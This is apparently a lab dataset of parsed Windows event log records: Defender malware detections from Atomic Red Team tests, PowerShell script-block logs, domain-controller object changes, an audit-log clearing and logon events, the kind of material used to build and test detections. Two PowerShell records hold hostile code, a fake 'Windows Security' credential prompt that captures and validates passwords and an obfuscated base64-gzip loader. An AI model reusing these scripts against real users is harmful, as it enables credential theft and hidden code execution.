{"Timestamp": "2019-07-18 20:41:16.418508Z", "Channel": "Microsoft-Windows-Windows Defender/Operational", "Provider": "Microsoft-Windows-Windows Defender", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-18", "EventID": 1116, "RecordID": 75, "Level": "Warning", "Descr": "<ProductName> has detected malware or other potentially unwanted software", "ProductName": "Windows Defender Antivirus", "ProductVersion": "4.18.1906.3", "DetectionId": "{37522D93-EBDD-4A5B-93B6-E984C9E3FD38}", "DetectionTime": "2019-07-18T20:40:16.697Z", "Threat": "HackTool:JS/Jsprat", "Severity": "High", "Category": "Tool", "Link": "https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:JS/Jsprat&threatid=2147708292&enterprise=0", "Status": null, "Source": "%%818", "ProcessPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "DetectionUser": "MSEDGEWIN10\\IEUser", "Path": "file:_C:\\AtomicRedTeam\\atomic-red-team-master\\atomics\\T1100\\shells\\b.jsp->(SCRIPT0005)", "Origin": "%%845", "Execution": "%%813", "Type": "%%862", "Action": "%%887", "ErrorCode": "0x00000000", "Error": "The operation completed successfully. ", "PostCleanStatus": "0", "AdditionalActions": "No additional actions required", "RemediationUser": null, "SignatureVersion": "AV: 1.297.1333.0, AS: 1.297.1333.0, NIS: 1.297.1333.0", "EngineVersion": "AM: 1.1.16100.4, NIS: 1.1.16100.4"}
{"Timestamp": "2019-07-18 20:40:16.396422Z", "Channel": "Microsoft-Windows-Windows Defender/Operational", "Provider": "Microsoft-Windows-Windows Defender", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-18", "EventID": 1116, "RecordID": 48, "Level": "Warning", "Descr": "<ProductName> has detected malware or other potentially unwanted software", "ProductName": "Windows Defender Antivirus", "ProductVersion": "4.18.1906.3", "DetectionId": "{8791B1FB-0FE7-412E-B084-524CB5A221F3}", "DetectionTime": "2019-07-18T20:40:13.775Z", "Threat": "Trojan:XML/Exeselrun.gen!A", "Severity": "Severe", "Category": "Trojan", "Link": "https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:XML/Exeselrun.gen!A&threatid=2147735426&enterprise=0", "Status": null, "Source": "%%818", "ProcessPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "DetectionUser": "MSEDGEWIN10\\IEUser", "Path": "file:_C:\\AtomicRedTeam\\atomic-red-team-master\\atomics\\T1086\\payloads\\test.xsl", "Origin": "%%845", "Execution": "%%813", "Type": "%%823", "Action": "%%887", "ErrorCode": "0x00000000", "Error": "The operation completed successfully. ", "PostCleanStatus": "0", "AdditionalActions": "No additional actions required", "RemediationUser": null, "SignatureVersion": "AV: 1.297.1333.0, AS: 1.297.1333.0, NIS: 1.297.1333.0", "EngineVersion": "AM: 1.1.16100.4, NIS: 1.1.16100.4"}
{"Timestamp": "2019-07-18 20:40:00.730676Z", "Channel": "Microsoft-Windows-Windows Defender/Operational", "Provider": "Microsoft-Windows-Windows Defender", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-18", "EventID": 1116, "RecordID": 37, "Level": "Warning", "Descr": "<ProductName> has detected malware or other potentially unwanted software", "ProductName": "Windows Defender Antivirus", "ProductVersion": "4.18.1906.3", "DetectionId": "{511224D4-1EB4-47B9-BC4A-37E21F923FED}", "DetectionTime": "2019-07-18T20:40:00.580Z", "Threat": "Trojan:PowerShell/Powersploit.M", "Severity": "Severe", "Category": "Trojan", "Link": "https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Powersploit.M&threatid=2147725349&enterprise=0", "Status": null, "Source": "%%818", "ProcessPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "DetectionUser": "MSEDGEWIN10\\IEUser", "Path": "file:_C:\\AtomicRedTeam\\atomic-red-team-master\\atomics\\T1056\\Get-Keystrokes.ps1", "Origin": "%%845", "Execution": "%%813", "Type": "%%822", "Action": "%%887", "ErrorCode": "0x00000000", "Error": "The operation completed successfully. ", "PostCleanStatus": "0", "AdditionalActions": "No additional actions required", "RemediationUser": null, "SignatureVersion": "AV: 1.297.1333.0, AS: 1.297.1333.0, NIS: 1.297.1333.0", "EngineVersion": "AM: 1.1.16100.4, NIS: 1.1.16100.4"}
{"Timestamp": "2019-09-09 13:35:09.315230Z", "Channel": "Microsoft-Windows-PowerShell/Operational", "Provider": "Microsoft-Windows-PowerShell", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-21-3461203602-4096304019-2269080069-1000", "EventID": 4104, "RecordID": 1123, "Level": "Warning", "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)", "MessageNumber": "1", "MessageTotal": "1", "ScriptBlockText": "function Invoke-LoginPrompt{\n$cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Please enter user credentials\", \"$env:userdomain\\$env:username\",\"\")\n$username = \"$env:username\"\n$domain = \"$env:userdomain\"\n$full = \"$domain\" + \"\\\" + \"$username\"\n$password = $cred.GetNetworkCredential().password\nAdd-Type -assemblyname System.DirectoryServices.AccountManagement\n$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)\nwhile($DS.ValidateCredentials(\"$full\",\"$password\") -ne $True){\n    $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Invalid Credentials, Please try again\", \"$env:userdomain\\$env:username\",\"\")\n    $username = \"$env:username\"\n    $domain = \"$env:userdomain\"\n    $full = \"$domain\" + \"\\\" + \"$username\"\n    $password = $cred.GetNetworkCredential().password\n    Add-Type -assemblyname System.DirectoryServices.AccountManagement\n    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)\n    $DS.ValidateCredentials(\"$full\", \"$password\") | out-null\n    }\n $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password\n $output\n R{START_PROCESS}\n}\nInvoke-LoginPrompt", "ScriptBlockId": "c7ca7056-b317-4fff-b796-05d8ef896dcd", "Path": null}
{"Timestamp": "2019-09-09 13:35:08.655802Z", "Channel": "Microsoft-Windows-PowerShell/Operational", "Provider": "Microsoft-Windows-PowerShell", "Hostname": "MSEDGEWIN10", "SID": "S-1-5-21-3461203602-4096304019-2269080069-1000", "EventID": 4104, "RecordID": 1122, "Level": "Warning", "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)", "MessageNumber": "1", "MessageTotal": "1", "ScriptBlockText": "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAAlVdl0CA81UXW/aMBR996+4svJANJIfgNQHBNs6aaWIsO2hnSbXuaVeEzuyHdKI8d93YwIDTUJlfVkeLPme+3F87lEeay29Mho+6bV5xuSzWSk9t6as/IZF0mIOVxBdG+fTWqU74IOxEwJQeyWKAf+mdG4aBxnK2irf8iHweYHCIVAKWqgdHfJQ4bqECPV61AG5KYXS94e7FiXyIecxi/ZXYsBPcRbtyk6QXYiwx7ooAtJH4B3w+3BGRx0q4VxjbHhfRy79iH6GnkLPR6+L030eG+d5smwrhIQiWD4UbSCXtc5jmU6VRemNbTO0ayXRpWMpTa39jdBihSX1Y9E0o2kzbJLbh5+UfUEtSa+0VJUoJoZEffGDuwuK+5qO/ffR6EbIJ6UxZs2TKnBArNKvolC58Pjn5W7Ag5C0i4NUPIZEI0RLW2O8YUDfv1uEDNcNhaORQ+h9420LYtXt7nVWCUzO2CXgZywT8FfZJmRebJ2u6u32CbP/Mwv1nM4aCE4c9AtM7RNNSCjeMogoUNW+U1NjszfUGWGph8OCKCdmJ8IX2s+M1BzCNOyOjHSQvu/OYLHJluPF8sd8cTt5n2VbtmV///R+A6HMO3IQBQAA'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))", "ScriptBlockId": "37f6d110-cfdf-4118-8748-17638e258531", "Path": null}
{"Timestamp": "2019-05-08 03:00:37.624196Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "-", "SID": "S-1-5-21-738609754-2819869699-4189121830-500", "EventID": 4742, "RecordID": 203062, "Level": "0", "Descr": "A computer account was changed", "ComputerAccountChange": "-", "TargetUsername": "ALICE$", "TargetDomain": "insecurebank", "TargetSID": "S-1-5-21-738609754-2819869699-4189121830-1120", "Username": "Administrator", "Domain": "insecurebank", "LogonId": "0x418a6da", "PrivilegeList": "-", "SamAccountName": "-", "DisplayName": "-", "UserPrincipalName": "-", "HomeDirectory": "-", "HomePath": "-", "ScriptPath": "-", "ProfilePath": "-", "UserWorkstations": "-", "PasswordLastSet": "-", "AccountExpires": "-", "PrimaryGroupId": "-", "AllowedToDelegateTo": "-", "OldUacFlags+": "-", "OldUacFlags": "-", "NewUacFlags+": "-", "NewUacFlags": "-", "UserAccountControl": "-", "UserParameters": "-", "SIDHistory": "-", "LogonHours": "-", "SPNs": "\n\t\tHOST/alice.insecurebank.local\n\t\tRestrictedKrbHost/alice.insecurebank.local\n\t\tHOST/ALICE\n\t\tRestrictedKrbHost/ALICE\n\t\tTERMSRV/alice.insecurebank.local\n\t\tTERMSRV/ALICE\n\t\tWSMAN/alice.insecurebank.local\n\t\tWSMAN/alice\n\t\tE3514235-4B06-11D1-AB04-00C04FC2DCD2/ae9a3b29-01d1-4851-8ca8-e49cd3985e5b/insecurebank.local"}
{"Timestamp": "2019-05-08 03:00:37.623163Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-500", "EventID": 4662, "RecordID": 203061, "Level": "0", "Descr": "An operation was performed on an object", "Username": "Administrator", "Domain": "insecurebank", "LogonId": "0x418a6da", "ObjectServer": "DS", "ObjectType": "%{bf967a92-0de6-11d0-a285-00aa003049e2}", "ObjectName": "%{6c4c19a5-c129-4e8e-8c49-a80898679de5}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "DELETE", "AccessMask": "0x10000", "Properties": "%%1537\n\t{bf967a92-0de6-11d0-a285-00aa003049e2}\n"}
{"Timestamp": "2019-05-08 03:00:37.621188Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-500", "EventID": 4662, "RecordID": 203060, "Level": "0", "Descr": "An operation was performed on an object", "Username": "Administrator", "Domain": "insecurebank", "LogonId": "0x418a6da", "ObjectServer": "DS", "ObjectType": "%{f0f8ffab-1191-11d0-a060-00aa006c33ed}", "ObjectName": "%{ae9a3b29-01d1-4851-8ca8-e49cd3985e5b}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "DELETE", "AccessMask": "0x10000", "Properties": "%%1537\n\t{f0f8ffab-1191-11d0-a060-00aa006c33ed}\n"}
{"Timestamp": "2019-05-08 03:00:37.615168Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-500", "EventID": 4662, "RecordID": 203059, "Level": "0", "Descr": "An operation was performed on an object", "Username": "Administrator", "Domain": "insecurebank", "LogonId": "0x418a6fb", "ObjectServer": "DS", "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "ObjectName": "%{c6faf700-bfe4-452a-a766-424f84c29583}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "Control Access", "AccessMask": "0x100", "Properties": "%%7688\n\t\t{1131f6ac-9c07-11d1-f79f-00c04fc2dcd2}\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\n"}
{"Timestamp": "2019-05-08 03:00:37.591203Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-500", "EventID": 4662, "RecordID": 203058, "Level": "0", "Descr": "An operation was performed on an object", "Username": "Administrator", "Domain": "insecurebank", "LogonId": "0x418a6fb", "ObjectServer": "DS", "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "ObjectName": "%{c6faf700-bfe4-452a-a766-424f84c29583}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "Control Access", "AccessMask": "0x100", "Properties": "%%7688\n\t\t{1131f6ac-9c07-11d1-f79f-00c04fc2dcd2}\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\n"}
{"Timestamp": "2019-05-08 03:00:37.586173Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "-", "SID": "S-1-5-21-738609754-2819869699-4189121830-500", "EventID": 4742, "RecordID": 203057, "Level": "0", "Descr": "A computer account was changed", "ComputerAccountChange": "-", "TargetUsername": "ALICE$", "TargetDomain": "insecurebank", "TargetSID": "S-1-5-21-738609754-2819869699-4189121830-1120", "Username": "Administrator", "Domain": "insecurebank", "LogonId": "0x418a6fb", "PrivilegeList": "-", "SamAccountName": "-", "DisplayName": "-", "UserPrincipalName": "-", "HomeDirectory": "-", "HomePath": "-", "ScriptPath": "-", "ProfilePath": "-", "UserWorkstations": "-", "PasswordLastSet": "-", "AccountExpires": "-", "PrimaryGroupId": "-", "AllowedToDelegateTo": "-", "OldUacFlags+": "-", "OldUacFlags": "-", "NewUacFlags+": "-", "NewUacFlags": "-", "UserAccountControl": "-", "UserParameters": "-", "SIDHistory": "-", "LogonHours": "-", "SPNs": "\n\t\tHOST/alice.insecurebank.local\n\t\tRestrictedKrbHost/alice.insecurebank.local\n\t\tHOST/ALICE\n\t\tRestrictedKrbHost/ALICE\n\t\tTERMSRV/alice.insecurebank.local\n\t\tTERMSRV/ALICE\n\t\tWSMAN/alice.insecurebank.local\n\t\tWSMAN/alice\n\t\tGC/alice.insecurebank.local/insecurebank.local\n\t\tE3514235-4B06-11D1-AB04-00C04FC2DCD2/ae9a3b29-01d1-4851-8ca8-e49cd3985e5b/insecurebank.local"}
{"Timestamp": "2019-05-08 03:00:37.583261Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-500", "EventID": 4662, "RecordID": 203056, "Level": "0", "Descr": "An operation was performed on an object", "Username": "Administrator", "Domain": "insecurebank", "LogonId": "0x418a6fb", "ObjectServer": "DS", "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "ObjectName": "%{c6faf700-bfe4-452a-a766-424f84c29583}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "Control Access", "AccessMask": "0x100", "Properties": "%%7688\n\t\t{9923a32a-3607-11d2-b9be-0000f87a36b2}\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\n"}
{"Timestamp": "2019-05-08 03:00:37.572176Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "-", "SID": "S-1-5-21-738609754-2819869699-4189121830-500", "EventID": 4742, "RecordID": 203054, "Level": "0", "Descr": "A computer account was changed", "ComputerAccountChange": "-", "TargetUsername": "ALICE$", "TargetDomain": "insecurebank", "TargetSID": "S-1-5-21-738609754-2819869699-4189121830-1120", "Username": "Administrator", "Domain": "insecurebank", "LogonId": "0x418a6da", "PrivilegeList": "-", "SamAccountName": "-", "DisplayName": "-", "UserPrincipalName": "-", "HomeDirectory": "-", "HomePath": "-", "ScriptPath": "-", "ProfilePath": "-", "UserWorkstations": "-", "PasswordLastSet": "-", "AccountExpires": "-", "PrimaryGroupId": "-", "AllowedToDelegateTo": "-", "OldUacFlags+": "-", "OldUacFlags": "-", "NewUacFlags+": "-", "NewUacFlags": "-", "UserAccountControl": "-", "UserParameters": "-", "SIDHistory": "-", "LogonHours": "-", "SPNs": "\n\t\tHOST/alice.insecurebank.local\n\t\tRestrictedKrbHost/alice.insecurebank.local\n\t\tHOST/ALICE\n\t\tRestrictedKrbHost/ALICE\n\t\tTERMSRV/alice.insecurebank.local\n\t\tTERMSRV/ALICE\n\t\tWSMAN/alice.insecurebank.local\n\t\tWSMAN/alice\n\t\tGC/alice.insecurebank.local/insecurebank.local"}
{"Timestamp": "2019-05-08 03:00:37.541177Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-500", "EventID": 4662, "RecordID": 203053, "Level": "0", "Descr": "An operation was performed on an object", "Username": "Administrator", "Domain": "insecurebank", "LogonId": "0x418a6da", "ObjectServer": "DS", "ObjectType": "%{f780acc0-56f0-11d1-a9c6-0000f80367c1}", "ObjectName": "%{a40d1d35-0354-4180-987a-da7c4888fdad}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "Create Child", "AccessMask": "0x1", "Properties": "%%7680\n\t{bf967a92-0de6-11d0-a285-00aa003049e2}\n"}
{"Timestamp": "2019-05-08 03:00:11.778188Z", "Channel": "Security", "Provider": "Microsoft-Windows-Eventlog", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-500", "EventID": 1102, "RecordID": 203050, "Level": "Information", "Descr": "The audit log was cleared", "Username": "administrator", "Domain": "insecurebank", "LogonId": "0x218b896"}
{"Timestamp": "2019-03-18 22:16:19.989944Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 563342, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-18", "TargetUsername": "WIN-77LTAPHIQ1R$", "TargetDomain": "EXAMPLE", "TargetLogonId": "0x116c7b", "LogonType+": "3", "LogonType": "3", "LogonProcess": "Kerberos", "AuthenticationPackage": "Kerberos", "WorkstationName": null, "LogonGUID": "5FDB15EE-2283-F23C-E23B-5E5DDB11BB9C", "TransmittedServices": "-", "KeyLength": "0", "ProcessId": "0x0", "ProcessPath": "-", "IP": "::1", "Port": "55589"}
{"Timestamp": "2019-03-18 22:15:49.692401Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 563300, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-21-1587066498-1489273250-1035260531-1106", "TargetUsername": "user01", "TargetDomain": "EXAMPLE", "TargetLogonId": "0x110085", "LogonType+": "3", "LogonType": "3", "LogonProcess": "Kerberos", "AuthenticationPackage": "Kerberos", "WorkstationName": null, "LogonGUID": "31E347DC-FF67-08B3-EADC-1EC267B1975B", "TransmittedServices": "-", "KeyLength": "0", "ProcessId": "0x0", "ProcessPath": "-", "IP": "10.0.2.17", "Port": "49249"}
{"Timestamp": "2019-03-18 22:15:49.676748Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": "S-1-5-20", "EventID": 4688, "RecordID": 563299, "Level": "0", "Descr": "A new process has been created", "Username": "WIN-77LTAPHIQ1R$", "Domain": "EXAMPLE", "LogonId": "0x3e4", "NewProcessId": "0x424", "NewProcessPath": "C:\\Windows\\System32\\calc.exe", "TokenElevationType": "TokenElevationTypeDefault (1)", "ProcessId": "0xae8", "Command": null}
{"Timestamp": "2019-03-18 22:15:49.645889Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": "S-1-5-18", "EventID": 4688, "RecordID": 563298, "Level": "0", "Descr": "A new process has been created", "Username": "WIN-77LTAPHIQ1R$", "Domain": "EXAMPLE", "LogonId": "0x3e7", "NewProcessId": "0xae8", "NewProcessPath": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "TokenElevationType": "TokenElevationTypeDefault (1)", "ProcessId": "0x248", "Command": null}
{"Timestamp": "2019-03-18 22:15:49.614293Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 563297, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-21-1587066498-1489273250-1035260531-500", "TargetUsername": "Administrator", "TargetDomain": "EXAMPLE", "TargetLogonId": "0x10fc09", "LogonType+": "3", "LogonType": "3", "LogonProcess": "NtLmSsp ", "AuthenticationPackage": "NTLM", "WorkstationName": "PC01", "LogonGUID": "00000000-0000-0000-0000-000000000000", "TransmittedServices": "-", "KeyLength": "128", "ProcessId": "0x0", "ProcessPath": "-", "IP": "10.0.2.17", "Port": "49249"}
{"Timestamp": "2019-03-18 22:15:49.614293Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 563294, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-21-1587066498-1489273250-1035260531-500", "TargetUsername": "Administrator", "TargetDomain": "EXAMPLE", "TargetLogonId": "0x10fbeb", "LogonType+": "3", "LogonType": "3", "LogonProcess": "Kerberos", "AuthenticationPackage": "Kerberos", "WorkstationName": null, "LogonGUID": "BAEC19DA-130D-80F0-BD26-78045EE64D62", "TransmittedServices": "-", "KeyLength": "0", "ProcessId": "0x0", "ProcessPath": "-", "IP": "10.0.2.17", "Port": "49249"}
{"Timestamp": "2019-03-18 22:15:49.583102Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 563285, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-21-1587066498-1489273250-1035260531-500", "TargetUsername": "Administrator", "TargetDomain": "EXAMPLE", "TargetLogonId": "0x10fbcc", "LogonType+": "3", "LogonType": "3", "LogonProcess": "Kerberos", "AuthenticationPackage": "Kerberos", "WorkstationName": null, "LogonGUID": "BAEC19DA-130D-80F0-BD26-78045EE64D62", "TransmittedServices": "-", "KeyLength": "0", "ProcessId": "0x0", "ProcessPath": "-", "IP": "10.0.2.17", "Port": "49244"}
{"Timestamp": "2019-03-18 22:15:36.036376Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "WIN-77LTAPHIQ1R.example.corp", "SID": "S-1-0-0", "EventID": 4624, "RecordID": 563265, "Level": "0", "Descr": "An account was successfully logged on", "Username": "-", "Domain": "-", "LogonId": "0x0", "TargetSID": "S-1-5-18", "TargetUsername": "WIN-77LTAPHIQ1R$", "TargetDomain": "EXAMPLE", "TargetLogonId": "0x10fac2", "LogonType+": "3", "LogonType": "3", "LogonProcess": "Kerberos", "AuthenticationPackage": "Kerberos", "WorkstationName": null, "LogonGUID": "5FDB15EE-2283-F23C-E23B-5E5DDB11BB9C", "TransmittedServices": "-", "KeyLength": "0", "ProcessId": "0x0", "ProcessPath": "-", "IP": "fe80::79bf:8ee2:433c:2567", "Port": "55585"}
{"Timestamp": "2019-03-25 21:28:35.472614Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-1108", "EventID": 4662, "RecordID": 198242581, "Level": "0", "Descr": "An operation was performed on an object", "Username": "bob", "Domain": "insecurebank", "LogonId": "0x40f2719", "ObjectServer": "DS", "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "ObjectName": "%{c6faf700-bfe4-452a-a766-424f84c29583}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "WRITE_DAC", "AccessMask": "0x40000", "Properties": "%%1539\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\n"}
{"Timestamp": "2019-03-25 21:28:35.470615Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-1108", "EventID": 4662, "RecordID": 198242579, "Level": "0", "Descr": "An operation was performed on an object", "Username": "bob", "Domain": "insecurebank", "LogonId": "0x40f2719", "ObjectServer": "DS", "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "ObjectName": "%{c6faf700-bfe4-452a-a766-424f84c29583}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "WRITE_DAC", "AccessMask": "0x40000", "Properties": "%%1539\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\n"}
{"Timestamp": "2019-03-25 21:28:35.467613Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-1108", "EventID": 4662, "RecordID": 198242578, "Level": "0", "Descr": "An operation was performed on an object", "Username": "bob", "Domain": "insecurebank", "LogonId": "0x40f2719", "ObjectServer": "DS", "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "ObjectName": "%{c6faf700-bfe4-452a-a766-424f84c29583}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "WRITE_DAC", "AccessMask": "0x40000", "Properties": "%%1539\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\n"}
{"Timestamp": "2019-03-25 21:28:35.465616Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-1108", "EventID": 4662, "RecordID": 198242577, "Level": "0", "Descr": "An operation was performed on an object", "Username": "bob", "Domain": "insecurebank", "LogonId": "0x40f2719", "ObjectServer": "DS", "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "ObjectName": "%{c6faf700-bfe4-452a-a766-424f84c29583}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "WRITE_DAC", "AccessMask": "0x40000", "Properties": "%%1539\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\n"}
{"Timestamp": "2019-03-25 21:28:35.463625Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-1108", "EventID": 4662, "RecordID": 198242576, "Level": "0", "Descr": "An operation was performed on an object", "Username": "bob", "Domain": "insecurebank", "LogonId": "0x40f2719", "ObjectServer": "DS", "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "ObjectName": "%{c6faf700-bfe4-452a-a766-424f84c29583}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "WRITE_DAC", "AccessMask": "0x40000", "Properties": "%%1539\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\n"}
{"Timestamp": "2019-03-25 21:28:35.461613Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-1108", "EventID": 4662, "RecordID": 198242574, "Level": "0", "Descr": "An operation was performed on an object", "Username": "bob", "Domain": "insecurebank", "LogonId": "0x40f2719", "ObjectServer": "DS", "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "ObjectName": "%{c6faf700-bfe4-452a-a766-424f84c29583}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "WRITE_DAC", "AccessMask": "0x40000", "Properties": "%%1539\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\n"}
{"Timestamp": "2019-03-25 21:28:35.458618Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-1108", "EventID": 4662, "RecordID": 198242572, "Level": "0", "Descr": "An operation was performed on an object", "Username": "bob", "Domain": "insecurebank", "LogonId": "0x40f2719", "ObjectServer": "DS", "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "ObjectName": "%{c6faf700-bfe4-452a-a766-424f84c29583}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "WRITE_DAC", "AccessMask": "0x40000", "Properties": "%%1539\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\n"}
{"Timestamp": "2019-03-25 21:28:35.440616Z", "Channel": "Security", "Provider": "Microsoft-Windows-Security-Auditing", "Hostname": "DC1.insecurebank.local", "SID": "S-1-5-21-738609754-2819869699-4189121830-1108", "EventID": 4662, "RecordID": 198242569, "Level": "0", "Descr": "An operation was performed on an object", "Username": "bob", "Domain": "insecurebank", "LogonId": "0x40f2719", "ObjectServer": "DS", "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "ObjectName": "%{c6faf700-bfe4-452a-a766-424f84c29583}", "OperationType": "Object Access", "HandleId": "0x0", "AccessList": "WRITE_DAC", "AccessMask": "0x40000", "Properties": "%%1539\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\n"}
